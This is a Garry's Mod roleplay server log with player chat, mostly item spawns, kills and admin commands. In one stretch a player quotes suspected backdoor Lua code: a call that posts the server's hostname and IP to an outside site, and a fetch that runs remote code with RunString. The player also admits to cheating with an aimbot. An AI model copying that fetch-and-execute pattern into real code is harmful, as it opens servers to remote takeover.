+[19:24:38] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[19:24:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[19:24:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[19:24:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[19:24:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:24:40] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:24:40] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:24:40] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:24:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:24:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:24:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:25:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:02] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:02] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:25:05] bobbicus has a wonderful voice killed Derp using player
+[19:25:35] DrDerpenstein killed Derp using player
+[19:25:51] bobbicus has a wonderful voice killed Thomasツ using player
+[19:25:54] Thomasツ: // why
+[19:26:00] bobbicus has a wonderful voice: // wrong button sorry
+[19:26:05] Thomasツ: // 5 times?
+[19:26:10] bobbicus has a wonderful voice: // yes?
+[19:26:13] DrDerpenstein: // he's meeming
+[19:26:21] Thomasツ: // can i have my gun back
+[19:26:25] DrDerpenstein: /pm thomas want us to take it to sit?
+[19:26:25] bobbicus has a wonderful voice: // what gun wtf!?
+[19:26:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_jar
+[19:26:31] Thomasツ: // cw_ws_m16a4
+[19:26:41] Thomasツ: cw_ws_m16a4
+[19:26:42] Thomasツ: !cloak xd
+[19:26:42] bobbicus has a wonderful voice: /drop
+[19:26:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[19:26:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[19:26:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[19:26:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[19:26:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:26:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:26:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:26:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:26:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:26:47] bobbicus has a wonderful voice: // come here
+[19:26:49] Derp<STEAM_0:0:52504530> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[19:26:49] Derp<STEAM_0:0:52504530> spawned/gave himself swep cw_ws_m16a4
+[19:26:49] Derp<STEAM_0:0:52504530> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[19:26:49] Derp<STEAM_0:0:52504530> spawned/gave himself swep cw_ws_m16a4
+[19:26:50] Derp<STEAM_0:0:52504530> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[19:26:50] Derp<STEAM_0:0:52504530> spawned/gave himself swep cw_ws_m16a4
+[19:26:50] Derp<STEAM_0:0:52504530> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[19:26:50] Derp<STEAM_0:0:52504530> spawned/gave himself swep cw_ws_m16a4
+[19:26:50] Derp<STEAM_0:0:52504530> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[19:26:50] Derp<STEAM_0:0:52504530> spawned/gave himself swep cw_ws_m16a4
+[19:26:51] bobbicus has a wonderful voice: // i spawned one
+[19:27:24] Derp killed DrDerpenstein using player
+[19:27:28] Thomasツ killed bobbicus has a wonderful voice using player
+[19:27:52] Thomasツ killed bobbicus has a wonderful voice using player
+[19:28:10] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:28:19] Thomasツ killed bobbicus has a wonderful voice using player
+[19:28:23] Thomasツ: / /hwo
+[19:28:32] Thomasツ: // how are you hiting me
+[19:28:35] DrDerpenstein: /job Citizen
+[19:28:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_bong03_ent
+[19:28:54] Thomasツ<STEAM_0:0:121940340> spawned/gave himself swep cw_tr09_mp9
+[19:29:01] Derp killed DrDerpenstein using player
+[19:29:30] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:29:34] bobbicus has a wonderful voice killed Derp using player
+[19:29:34] Thomasツ killed bobbicus has a wonderful voice using player
+[19:29:57] DrDerpenstein killed bobbicus has a wonderful voice using player
+[19:30:03] bobbicus has a wonderful voice killed Derp using player
+[19:30:03] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:30:03] bobbicus has a wonderful voice killed Thomasツ using player
+[19:30:11] Thomasツ: // ok yeah
+[19:30:25] bobbicus has a wonderful voice: // ok yeah what
+[19:30:41] DrDerpenstein: // please stop aimbotting
+[19:30:46] bobbicus has a wonderful voice: // okay men
+[19:30:54] bobbicus has a wonderful voice: // ill turn them off dw
+[19:30:58] Dropped "bobbicus has a wonderful voice" from server<STEAM_0:1:179345279>
+[19:31:26] Thomasツ: /dorp
+[19:31:31] Thomasツ: /drop
+[19:32:11] Client "bert simson" connected.
+[19:35:41] Client "bert simson" spawned in server <STEAM_0:1:179345279> (took 210 seconds).
+[19:36:15] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_bong03_ent
+[19:36:43] bobbicus has a wonderful voice: // there
+[19:36:47] bobbicus has a wonderful voice: // they're actually off
+[19:36:55] DrDerpenstein: // yeet
+[19:37:15] Dropped "bobbicus has a wonderful voice" from server<STEAM_0:1:179345279>
+[19:37:34] Client "bert simson" connected.
+[19:39:18] Client "bert simson" spawned in server <STEAM_0:1:179345279> (took 104 seconds).
+[19:39:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[19:39:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[19:39:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:39:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth
+[19:40:04] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:40:04] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:40:04] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:40:09] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:40:28] Thomasツ: /name afk
+[19:40:32] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:40:34] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:40:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent zmlab_meth_baggy
+[19:41:54] Client "jd_hickey4560" connected.
+[19:42:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:42:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:42:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:42:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:42:21] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:42:21] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:42:24] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:45:37] Client "jd_hickey4560" spawned in server <STEAM_0:1:100634110> (took 223 seconds).
+[19:46:13] afk: /name Thomasツ
+[19:46:25] afk: /name Thomas
+[19:47:53] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_jar
+[19:47:55] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_bong03_ent
+[19:47:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_bong03_ent
+[19:48:24] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_bong03_ent
+[19:48:41] Thomas: /drop
+[19:49:18] Derp: !safezones
+[19:49:28] Derp: !safezones
+[19:49:32] DrDerpenstein: !sz
+[19:52:37] jd_hickey4560<STEAM_0:1:100634110> used the tool textscreen on maps/rp_downtown_tits_v2.bsp
+[19:52:56] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_nmrih_molotov
+[19:54:16] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_nmrih_molotov
+[19:54:18] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_nmrih_molotov
+[19:54:19] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_nmrih_molotov
+[19:54:19] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_nmrih_molotov
+[19:54:59] Thomas killed Thomas
+[19:55:06] Thomas: // thats really op
+[19:55:37] DrDerpenstein killed DrDerpenstein
+[19:56:12] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[19:56:13] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_nmrih_molotov
+[19:56:17] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[19:56:20] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_nmrih_molotov
+[19:56:22] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[19:56:26] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[19:56:29] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[19:56:49] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[19:56:56] Thomas killed DrDerpenstein using rj_molotov_hull
+[19:57:14] Thomas<STEAM_0:0:121940340> spawned/gave himself swep cw_vss
+[19:57:14] Thomas<STEAM_0:0:121940340> spawned/gave himself swep cw_vss
+[19:57:14] Thomas<STEAM_0:0:121940340> spawned/gave himself swep cw_vss
+[19:58:44] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/fcc/flying_crawler_car.mdl
+[19:59:17] bobbicus has a wonderful voice was killed by prop_vehicle_jeep
+[19:59:21] bobbicus has a wonderful voice: @ propkill
+[19:59:21] bobbicus has a wonderful voice to admins: propkill
+[19:59:47] DrDerpenstein: /goto bert
+[19:59:51] DrDerpenstein: /goto bert
+[20:00:05] bobbicus has a wonderful voice: i need financial compensation
+[20:00:07] bobbicus has a wonderful voice: really
+[20:00:16] DrDerpenstein: /dropmoney 1000
+[20:00:19] bobbicus has a wonderful voice: EW
+[20:00:26] bobbicus has a wonderful voice: // That was the ambulance ride alone!
+[20:00:36] DrDerpenstein: /dropmoney 4000
+[20:00:42] bobbicus has a wonderful voice: that is okay
+[20:01:36] Derp was killed by prop_vehicle_jeep
+[20:02:40] jd_hickey4560<STEAM_0:1:100634110> used the tool remover on maps/rp_downtown_tits_v2.bsp
+[20:02:40] jd_hickey4560<STEAM_0:1:100634110> used the tool remover on models/hunter/plates/plate1x1.mdl
+[20:02:55] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[20:02:57] DrDerpenstein suicided!
+[20:02:59] jd_hickey4560<STEAM_0:1:100634110> spawned model models/props_junk/plasticcrate01a.mdl
+[20:06:10] Client "Mattopaz" connected.
+[20:06:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:06:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:06:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:06:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:06:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[20:06:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[20:06:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[20:06:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:06:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:06:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:06:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:06:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:06:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:06:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:06:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:06:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:06:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:06:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[20:06:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:06:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:06:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:06:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:06:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:06:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:06:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:06:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[20:07:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[20:07:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[20:07:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[20:07:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[20:08:15] DrDerpenstein: /goto derp
+[20:08:40] Thomas: // almost 2 hrs
+[20:08:46] DrDerpenstein: // nice
+[20:10:06] Thomas killed DrDerpenstein using player
+[20:10:27] bobbicus has a wonderful voice: // why do you have a shared lua file that just sends the host name and server ip to http://geckoproject.cf/id.php
+[20:10:43] DrDerpenstein: what file?
+[20:10:47] DrDerpenstein: // what file?
+[20:10:48] Derp: // wat
+[20:11:00] Thomas: // derp only 5 mins
+[20:11:11] Thomas: // can i get forums link again
+[20:11:27] Derp: // u can access the forums if u press F4 and go to info
+[20:11:28] bobbicus has a wonderful voice: // idk im just lookin for exploits and I see noname.lua with
+[20:11:29] Dropped "jd_hickey4560" from server<STEAM_0:1:100634110>
+[20:11:29] bobbicus has a wonderful voice: // http.Post("http://geckoproject.cf/id.php",{name= GetHostName() , host= game.GetIPAddress()},function( result ) end)
+[20:11:36] Thomas: // oh yeah
+[20:12:13] DrDerpenstein: // lemme check it out 1 sec
+[20:12:36] DrDerpenstein: // what are you using to find that?
+[20:13:09] bobbicus has a wonderful voice: // just a tool that intercepts shared+client lua files from a server
+[20:13:10] DrDerpenstein: // do you know what addon/where its comming from?
+[20:13:56] DrDerpenstein: /goto bert
+[20:14:07] bobbicus has a wonderful voice: // its in the same directory where addons, games, lua and stuff are. its called noname.lua its just weird. also has a get 
+[20:14:12] bobbicus has a wonderful voice: // request for some other website
+[20:15:48] bobbicus has a wonderful voice: Iyhttps://gyazo.com/4d32e9bbf5daf7d6404be77bd08d1c4c
+[20:15:48] Thomas: // i applyed
+[20:15:51] bobbicus has a wonderful voice: https://gyazo.com/4d32e9bbf5daf7d6404be77bd08d1c4c
+[20:17:06] Derp added Thomas to group moderator
+[20:17:43] bobbicus has a wonderful voice: dont know what its about, look like the get request goes to some dead website as well
+[20:17:45] Derp: choking on water? thats not allowed... DEMOTED
+[20:18:20] Thomas: !jail @
+[20:18:22] Thomas: !unjail @
+[20:18:22] DrDerpenstein: i dont see noname.lua in our server list tho
+[20:18:23] Thomas: !return @
+[20:18:24] Thomas: !logs
+[20:18:26] bobbicus has a wonderful voice: /shrug
+[20:18:28] bobbicus has a wonderful voice: i dont know
+[20:18:31] Thomas: !logs
+[20:18:35] DrDerpenstein: the folder hierarchy doesnt match ours
+[20:18:38] Thomas: [GmodAdminSuite] [FAIL] Sorry, but you do not have permission to accessthe GmodAdminSuite menu
+[20:18:38] Derp: u cant use logs? is that what u said?
+[20:18:43] DrDerpenstein: how did you dl those files?
+[20:18:44] Derp: !gas
+[20:18:47] Thomas: !unjail xd
+[20:18:49] Thomas: !uncloak xd
+[20:19:07] Thomas: !uncloak xd
+[20:19:07] Thomas: !uncloak xd
+[20:19:09] Thomas: !cloak xd
+[20:19:20] Thomas: !cloak xd
+[20:19:21] Thomas: !uncloak xd
+[20:19:31] Derp: try using logs now
+[20:19:33] Thomas: !logs
+[20:19:35] bobbicus has a wonderful voice: just some tool, these are just shared and clientside files though. maybe its some serverside script making t
+[20:19:35] Thomas: [GmodAdminSuite] [FAIL] Sorry, but you do not have permission to accessthe GmodAdminSuite menu
+[20:19:42] bobbicus has a wonderful voice: hose clientside files
+[20:19:44] Derp: its !gas
+[20:19:44] bobbicus has a wonderful voice: /shrug
+[20:19:48] Thomas: !gasx
+[20:19:49] DrDerpenstein: is that in your own steam directory?
+[20:19:52] Thomas: !gas
+[20:19:53] Derp: !gas
+[20:19:54] bobbicus has a wonderful voice: no?
+[20:19:59] DrDerpenstein: its on our server?
+[20:20:06] DrDerpenstein: i legit cant find it
+[20:20:16] bobbicus has a wonderful voice: i dont know, could just be a clientside file
+[20:20:22] Derp: what happened when u type !gas
+[20:20:26] Thomas: !gas
+[20:20:27] Thomas: [GmodAdminSuite] [FAIL] Sorry, but you do not have permission to accessthe GmodAdminSuite menu
+[20:20:32] Derp: !gas
+[20:20:41] bobbicus has a wonderful voice: also this in it
+[20:20:42] bobbicus has a wonderful voice: http.Fetch("http://geckoproject.cf/gubbibiggay.txt", function(b,l,h,c)RunString(b)end,nil)
+[20:20:51] DrDerpenstein: lol whut
+[20:21:16] bobbicus has a wonderful voice: dunno what function b is either
+[20:21:18] Derp: !gas
+[20:21:21] Derp: ok try now
+[20:21:25] Thomas: !gas
+[20:21:27] Thomas: !logs
+[20:21:32] Thomas: !gas
+[20:21:43] Thomas: !logs
+[20:21:51] Derp: and yeah about godmode and cloak i have that disabled because i dont think mods need it
+[20:22:03] bobbicus has a wonderful voice: looks like website is dead anyways
+[20:22:37] Derp: u can set hp i believe
+[20:22:49] Thomas: !hp Thomas 100
+[20:22:49] Thomas set the hp for Themself to 100
+[20:22:55] Thomas: !hp Thomas 100000
+[20:22:55] Thomas set the hp for Themself to 100000
+[20:23:17] Thomas: !hp Thomas 100
+[20:23:17] Thomas set the hp for Themself to 100
+[20:23:22] Thomas: !logs
+[20:23:24] Derp: there is a mod on duty job
+[20:23:38] Derp: its at the very bottom
+[20:24:37] Derp: thats strange it should work
+[20:24:46] Derp added Derp to group moderator
+[20:25:08] Derp: i think i know how to fix it but its not gonna be fixed until next update
+[20:25:12] Derp: in the meanwhile just use citizen
+[20:25:38] Thomas: !spectate
+[20:25:38] Derp: ok
+[20:25:43] Thomas: !cloak xd
+[20:25:49] Thomas: /advert <hsv> FBI OPEN UP! (Raid, PD Raid, Party Raid, Assist) </hsv>
+[20:25:59] Thomas: // false
+[20:26:10] Thomas: !cloak xd
+[20:26:11] bobbicus has a wonderful voice: // set me to owner wtf
+[20:26:19] DrDerpenstein: // lol testing things
+[20:26:19] Derp granted access "ulx god" to group moderator
+[20:26:25] Derp granted access "ulx ungod" to group moderator
+[20:26:34] Derp granted access "ulx cloak" to group moderator
+[20:26:36] Derp granted access "ulx uncloak" to group moderator
+[20:26:39] Derp: ok there u go
+[20:26:39] bobbicus has a wonderful voice: // grant me access to ulx rcon real quick
+[20:26:50] DrDerpenstein: // sorry mate
+[20:26:56] Derp: how
+[20:27:05] Derp: ah
+[20:27:10] Derp: well ill be sure to fix it anyways
+[20:27:26] Derp: lmao
+[20:27:26] Thomas: !cloak xd
+[20:27:27] Thomas: !uncloak xd
+[20:27:29] Derp: gmod is glitchy bruh
+[20:27:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:27:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:27:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:27:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:27:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:27:56] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:27:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:27:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:27:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:27:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:27:57] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:27:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:27:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:27:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:27:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:27:58] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[20:27:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[20:27:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[20:27:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:27:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:27:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:28:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:28:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[20:28:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[20:28:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[20:28:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[20:28:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[20:28:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[20:28:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[20:28:02] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[20:28:02] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:28:02] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[20:28:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:28:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[20:28:04] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[20:28:04] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[20:28:05] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:28:05] Thomas cloaked Themself by amount 0
+[20:28:05] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:28:05] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[20:28:06] Thomas uncloaked Themself
+[20:28:09] Thomas cloaked Themself by amount 0
+[20:28:11] Thomas uncloaked Themself
+[20:28:20] Derp: sorry about all of the trouble so far
+[20:28:21] Thomas<STEAM_0:0:121940340> spawned/gave himself swep cw_ak74
+[20:28:28] Thomas: !menu
+[20:29:14] bobbicus has a wonderful voice: ill enable my spinbot
+[20:29:18] Thomas: /name xd MrShrimp
+[20:29:25] bobbicus has a wonderful voice: /name thomas
+[20:29:30] Derp: !logs
+[20:29:39] xd MrShrimp cloaked Themself by amount 0
+[20:29:39] xd MrShrimp uncloaked Themself
+[20:30:25] Thomasツ<STEAM_0:0:121940340> changed their name to xd MrShrimp
+[20:30:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[20:30:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[20:30:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[20:30:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[20:30:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[20:30:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[20:30:45] Derp: !logs
+[20:31:29] xd MrShrimp: /advert <hsv> FBI OPEN UP! (Raid, PD Raid, Party Raid, Assist) </hsv>
+[20:31:41] xd MrShrimp: // false
+[20:31:55] Derp: ye
+[20:32:06] Derp: like a report?
+[20:32:10] Derp: @
+[20:32:50] xd MrShrimp: /setmoney xd 1
+[20:33:21] xd MrShrimp: !3p
+[20:33:24] xd MrShrimp: !3p
+[20:33:28] xd MrShrimp: !1p
+[20:33:33] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:35] Derp: wait are u trying to change cameras?
+[20:33:38] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:33:38] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:42] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:33:42] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:43] Derp: ah
+[20:33:44] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:33:44] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:46] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:33:46] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:51] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:33:51] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:53] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:33:53] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:54] Client "Womble" connected.
+[20:33:54] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:33:54] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:33:58] thomas: // WOMBLE
+[20:34:01] xd MrShrimp cloaked Themself by amount 0
+[20:34:03] xd MrShrimp uncloaked Themself
+[20:34:18] xd MrShrimp: // who the fuck is that
+[20:34:20] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:20] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:22] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:22] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:23] Derp: no idea
+[20:34:25] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:25] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:27] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:27] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:29] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:29] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:31] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:31] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:32] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[20:34:32] thomas<STEAM_0:1:179345279> spawned model models/props_phx/misc/potato_launcher_cap.mdl
+[20:34:34] thomas<STEAM_0:1:179345279> used the tool creator on maps/rp_downtown_tits_v2.bsp
